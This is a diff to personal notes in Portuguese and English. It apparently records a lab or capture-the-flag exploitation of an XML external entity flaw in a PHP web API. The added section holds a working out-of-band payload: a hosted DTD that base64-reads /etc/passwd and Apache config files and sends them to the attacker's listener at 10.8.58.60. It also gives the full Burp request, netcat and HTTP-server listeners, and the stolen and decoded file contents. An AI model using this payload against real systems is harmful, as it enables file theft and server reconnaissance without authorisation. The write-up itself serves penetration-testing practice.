@@ -130,3 +130,94 @@ Tentando algo com ->
 #+end_src
 
 As requests chegam até o python server, porém estes payloads com dtd não estão funcionando ainda, vou continuar tentando nisso.
+
+Pegando o */etc/passwd* desta maneira ->
+
+*p.dtd* ->
+#+begin_src xml
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % dtd2 "<!ENTITY exfil SYSTEM 'http://10.8.58.60:8889/?data=%file;'>">
+%dtd2;
+#+end_src
+
+*burp payload* ->
+#+begin_src sh
+<?xml version="1.0" ?>
+<!DOCTYPE UserData [
+<!ENTITY % dtd SYSTEM "http://10.8.58.60:8888/p.dtd">
+%dtd;
+]>
+<UserData>
+  <UserInformation>
+    <UserName>&exfil;</UserName>
+    <Country>Canada</Country>
+  </UserInformation>
+</UserData>
+#+end_src
+
+*POST request with burp* ->
+#+begin_src sh
+POST /api/data HTTP/1.1
+Host: 172.20.22.36
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/xml
+Content-Length: 243
+
+<?xml version="1.0" ?>
+<!DOCTYPE UserData [
+<!ENTITY % dtd SYSTEM "http://10.8.58.60:8888/p.dtd">
+%dtd;
+]>
+<UserData>
+  <UserInformation>
+    <UserName>&exfil;</UserName>
+    <Country>Canada</Country>
+  </UserInformation>
+</UserData>
+#+end_src
+
+*listening with python server and netcat*
+: python3 -m http.server 8888
+
+: nc -lvnp 8889
+
+*results* ->
+#+begin_src sh
+GET/?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQo= HTTP/1.0
+Host: 10.8.58.60:8889
+#+end_src
+
+*Get the DocumentRoot*  ->
+#+begin_src sh
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf">
+<!ENTITY % dtd2 "<!ENTITY exfil SYSTEM 'http://10.8.58.60:8889/?data=%file;'>">
+%dtd2;
+#+end_src
+
+#+begin_src sh
+[15:36][]~ ✮ echo "PFZpcnR1YWxIb3N0ICo6ODA+CiAgICBEb2N1bWVudFJvb3QgL2FwcAogICAgPERpcmVjdG9yeSAvYXBwPgogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICAgICAgUmVxdWlyZSBhbGwgZ3JhbnRlZAogICAgPC9EaXJlY3Rvcnk+CjwvVmlydHVhbEhvc3Q+Cg==" | base64 -d
+<VirtualHost *:80>
+    DocumentRoot /app
+    <Directory /app>
+        AllowOverride All
+        Require all granted
+    </Directory>
+</VirtualHost>
+#+end_src
+
+** .htaccess file on /app/.htaccess
+#+begin_src sh
+[15:09][]~ ✮ echo "UmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZgpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZApSZXdyaXRlUnVsZSBeYXBpL2RhdGEkIC9pbmRleC5waHAvYXBpL2RhdGEgW0wsUVNBXQpSZXdyaXRlUnVsZSBeYXBpL2RhdGEvJCAvaW5kZXgucGhwL2FwaS9kYXRhIFtMLFFTQV0KUmV3cml0ZVJ1bGUgXmFwaSQgL2luZGV4LnBocC9hcGkgW0wsUVNBXQpSZXdyaXRlUnVsZSBeYXBpLyQgL2luZGV4LnBocC9hcGkgW0wsUVNBXQ==" | base64 -d
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^api/data$ /index.php/api/data [L,QSA]
+RewriteRule ^api/data/$ /index.php/api/data [L,QSA]
+RewriteRule ^api$ /index.php/api [L,QSA]
+RewriteRule ^api/$ /index.php/api [L,QSA]%
+#+end_src
